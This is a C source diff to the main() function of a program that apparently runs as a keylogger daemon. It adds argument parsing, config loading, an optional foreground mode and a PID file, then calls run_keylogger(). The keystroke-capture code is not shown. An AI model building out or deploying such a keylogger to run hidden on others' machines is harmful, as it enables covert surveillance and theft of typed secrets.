+// ---------------------------------------------------------------------------
+// Main
+// ---------------------------------------------------------------------------
 int main(int argc, char *argv[]) {
-    (void)argc; (void)argv;
-    
-    // Instalar manejadores de señales
+    // Parse CLI args before config so -c overrides defaults
+    const char *config_file = NULL;
+    for (int i = 1; i < argc; i++) {
+        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
+            print_usage(argv[0]);
+            return 0;
+        } else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--foreground") == 0) {
+            config.foreground = 1;
+        } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--debug") == 0) {
+            config.debug = 1;
+            config.foreground = 1;
+        } else if ((strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--config") == 0) && i + 1 < argc) {
+            config_file = argv[++i];
+        }
+    }
+
+    // Load configuration
+    init_config();
+    if (config_file) load_config(config_file);
+
+    // Setup signals
     signal(SIGTERM, signal_handler);
     signal(SIGINT, signal_handler);
-    
-    // Convertir en demonio
-    daemonize();
-    
-    // Ejecutar el keylogger
+
+    // Daemonize unless foreground mode
+    if (!config.foreground) {
+        daemonize();
+    }
+
+    // Write PID file
+    FILE *pid_fp = fopen(PID_FILE, "w");
+    if (pid_fp) {
+        fprintf(pid_fp, "%d\n", getpid());
+        fclose(pid_fp);
+    }
+
     run_keylogger();
-    
+
+    // Clean up PID file
+    unlink(PID_FILE);
     return 0;
 }
